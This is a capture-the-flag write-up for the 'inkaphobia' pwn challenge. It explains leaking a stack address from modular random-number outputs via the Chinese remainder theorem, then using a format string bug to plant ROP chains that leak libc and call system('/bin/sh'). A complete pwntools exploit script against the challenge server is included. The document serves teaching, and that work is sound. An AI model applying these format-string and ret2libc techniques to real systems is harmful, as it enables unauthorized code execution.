# inkaphobia
> Seems that random.org limits how much entropy you can use per day. So why not reuse entropy?
> 
> [https://imaginaryctf.org/r/505D-inkaphobia](https://imaginaryctf.org/r/505D-inkaphobia)
> [https://imaginaryctf.org/r/D39E-libc.so.6](https://imaginaryctf.org/r/D39E-libc.so.6) 
> `nc chal.imaginaryctf.org 42008`

## tl; dr
Leak stack using leaks in random number generation, use format string to write to the return address and ret2libc.

## solving

Well, we got a binary, a libc, and a netcat connection. Upon running the binary, we see that it lets us "generate" 6 random numbers, and then asks for our name.

```
$ checksec ./inkaphobia
[*] '/mnt/c/users/ethan/downloads/ImaginaryCTF-2021-Challenges/Pwn/inkaphobia/inkaphobia'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ ./inkaphobia
Welcome to my RNG service!
Enter max value: 10
Random number: 8
Enter max value: 13
Random number: 2
Enter max value: 15
Random number: 3
Enter max value: 19
Random number: 8
Enter max value: 13
Random number: 2
Enter max value: 14
Random number: 4
Thanks for visiting our RNG! What's your name?
ethan
Thanks for coming, ethan
```
Let's decompile to see what's going on behind the scenes. We fire up Ghidra:

```C
undefined8 main(void)
{
  time_t tVar1;
  long in_FS_OFFSET;
  int local_21c;
  char local_218 [520];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0); 
  setvbuf(stdin,(char *)0x0,2,0);
  mprotect(abort,0x2500000,5);
  puts("Welcome to my RNG service!");
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  local_21c = rand();
  dorng(&local_21c);
  puts("Thanks for visiting our RNG! What\'s your name?");
  fgets(local_218,0x200,stdin);
  printf("Thanks for coming, ");
  printf(local_218);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
 ```

First of all, we see the `setvbuf` calls. These are mostly irrelevant as they just help output to work when running on the server.

We also see `mprotect(abort,0x2500000,5);`. This was actually a failed attempt at making `__malloc_hook` unwritable, but I left it in to scare people although it doesn't really do much. (libc is already read/execute only)

Next, we have this:

```C
tVar1 = time((time_t *)0x0);
srand((uint)tVar1);
local_21c = rand();
dorng(&local_21c);
```

Well, seems like it's generating a random number, seeded by the time, and storing it in `local_21c`. Then, it calls `dorng()` on **the address of** `local_21c`. (although it might seem at first glance to be passing the random value in). Let's see what `dorng()` is doing.

Sidenote: The RNG uses the address of a variable as the random number, essentially reusing the randomness from ASLR. This is why the description hinted at reusing entropy.

```C
void dorng(long param_1)
{
  long lVar1;
  long in_FS_OFFSET;
  int local_224;
  char local_218 [520];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_224 = 0;
  while( true ) {
    if (5 < local_224) {
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    printf("Enter max value: ");
    fgets(local_218,0x10,stdin);
    lVar1 = atol(local_218);
    if ((0x7f < lVar1) || (lVar1 < 1)) break;
    printf("Random number: %ld\n",param_1 % lVar1,param_1 % lVar1);
    local_224 = local_224 + 1;
  }
  puts("Go away.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

OK, it seems that the function is letting you to view the parameter passed to it mod an user-controlled number, with certain restrictions. First, the number can only be viewed under a mod a total of 6 times. Secondly, the number can only be viewed mod a number between 1 and 128.

So... seems that we can use this functionality to leak a stack address, namely, the address that was passed to `dorng`. If we take the address mod 6 numbers, we can use CRT to solve for the address mod the greatest common denominator of the numbers.

Since we want to maximize the modulo of our final result, we would like this GCD to be  as big as possible. One way to do this (although I'm not sure if this is the most optimal way) is to just take the number mod the 6 largest primes less than 128. We write some code to do this:

```python
from pwn import *
from sympy.ntheory.modular import crt

context.arch = "amd64"
elf = ELF("./inkaphobia")
libc = ELF("./libc.so.6")
rop = ROP(elf)
conn = elf.process()

primes = [101, 103, 107, 109, 113, 127]

def get_remainder(num):
  conn.recvuntil(":")
  conn.sendline(str(num))
  conn.recvuntil(":")
  rem = int(conn.recvline().strip())
  log.info(f"addr ≡ {rem} (mod {num})")
  return rem

conn.recvline()
remainders = []
for prime in primes:
  remainders.append(get_remainder(prime))

res = crt(primes, remainders)
```

However, this does not give us quite enough information to deduce the address, as the modulo is smaller than `0xffffffffffffffff`. However, we know that stack addresses on a 64-bit system will be around `0x7ffff0000000`, so if we add our modulo repeatedly to our result from CRT until we get a value in this range, we can have a leak of the stack address that works most of the time.

So, we add this snippet of code to deduce a likely candidate for the stack address:

```python
buf_addr = [res[0]+res[1]*n for n in range(1, 1000) if hex(res[0]+res[1]*n)[0:4]=="0x7f" and len(hex(res[0]+res[1]*n))==14][0]
```

Well, now we're out of the `dorng()` function with a stack leak. Now what?

Back to the `main()` function:

```C
puts("Thanks for visiting our RNG! What\'s your name?");  
fgets(local_218,0x200,stdin);
printf("Thanks for coming, ");
printf(local_218);
```

We have a trivial format string vulnerability here. This gives us arbitrary read/write. However, since full RELRO is enabled and we don't have a libc leak, where can we target? 

Well, we have a stack leak. So, we use GDB to find the offset from the leaked address to the return address, which in this case is 540. We can now use our format string to write to the return address (I used pwntools' `fmtstr_payload` function for the first time, it's really nice), essentially writing a ropchain to the stack. Since we can now ROP, we can return to libc.

We can first use either ROP or our format string to leak libc, then return back to `main()` for a second pass. I used ROP to call `printf(printf_got)`, but there were other ways to do this.

When we return to `main()` we now have a libc leak and we can leak a stack address and create a second ropchain that will call `system("/bin/sh")`. Alternatively, overwriting the return address or `__malloc_hook` with a `one_gadget` was likely possible, but may have required some more thought on how to set up the registers correctly.

The result is a shell, and it works around half the time! (Sometimes the leaks don't work out because the address is off by a multiple of our modulo)

My solve script is below:

```python
from pwn import *
from sympy.ntheory.modular import crt

context.arch = "amd64"

elf = ELF("./inkaphobia")
libc = ELF("./libc.so.6")
rop = ROP(elf)

#conn = elf.process()
conn = remote("143.244.152.111", 42008)

primes = [101, 103, 107, 109, 113, 127]

def get_remainder(num):
  conn.recvuntil(":")
  conn.sendline(str(num))
  conn.recvuntil(":")
  rem = int(conn.recvline().strip())
  log.info(f"addr ≡ {rem} (mod {num})")
  return rem

conn.recvline()
remainders = []
for prime in primes: # get stack address mod primes
  remainders.append(get_remainder(prime))

# solve for the address mod 101*103*107*109*113*127
res = crt(primes, remainders) 

# find likely stack address
buf_addr = [res[0]+res[1]*n for n in range(1, 1000) if hex(res[0]+res[1]*n)[0:4]=="0x7f" and len(hex(res[0]+res[1]*n))==14][0]

log.info("Stack leak: " + hex(buf_addr))
conn.recvline()

# assemble our first ropchain
writes_l = [
  rop.find_gadget(["ret"])[0], # stack alignment
  rop.find_gadget(["pop rdi", "ret"])[0],
  elf.got["printf"],
  elf.symbols["printf"],
  rop.find_gadget(["ret"])[0], # stack alignment
  elf.symbols["main"],
]

writes = {}

# format it in a way that pwntools understands, also get the offsets right
for n, addr in enumerate(writes_l):
  writes[buf_addr+540+n*8] = addr

payload = fmtstr_payload(8, writes)

# send our payload and recieve our leaks
conn.sendline(payload)
printf = u64(conn.recvuntil("Welcome")[-13:-7] + b"\x00\x00")
log.info("printf(): " + hex(printf))
libc.address = printf - libc.symbols["printf"]
log.info("libc base: " + hex(libc.address))

# do it all over again
remainders = []
for prime in primes:
  remainders.append(get_remainder(prime))

res = crt(primes, remainders)

buf2_addr = [res[0]+res[1]*n for n in range(1, 1000) if hex(res[0]+res[1]*n)[0:4]=="0x7f" and len(hex(res[0]+res[1]*n))==14][0]
log.info("Second stack leak: " + hex(buf2_addr))
conn.recvline()

# system("/bin/sh")
writes_l = [
  rop.find_gadget(["ret"])[0], # stack alignment
  rop.find_gadget(["pop rdi", "ret"])[0],
  next(libc.search(b"/bin/sh")),
  libc.symbols["system"]
]

writes = {}

for n, addr in enumerate(writes_l):
  writes[buf2_addr+540+n*8] = addr

print(len(payload))
payload = fmtstr_payload(8, writes)
conn.sendline(payload)

# clean up output
conn.sendline("echo end")
conn.recvuntil("end\n")

conn.interactive()
```